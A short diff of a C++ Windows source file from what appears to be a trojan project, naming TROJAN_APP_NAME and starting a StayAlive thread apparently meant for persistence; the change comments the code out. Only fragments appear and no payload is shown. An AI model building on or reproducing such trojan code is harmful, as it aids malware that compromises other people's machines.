@@ -1,12 +1,12 @@
 #include "..\pch.h"
 
 #include "Application.hpp"
-#include "..\Network\TCPConnection.hpp"
+#include "..\Network.hpp"
 #include "Commands.hpp"
 #include "..\Tools.hpp"
 #include "..\Debugger.h"
 #include "..\Constants.h"
-
+/*
 BOOL Application::startSavingThread()
 {
 	if (!CreateThread(NULL, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(&StayAlive), TROJAN_APP_NAME, 0, NULL))
@@ -102,3 +102,4 @@ VOID Application::run()
 		ClearConsole();
 	}
 }
+*/
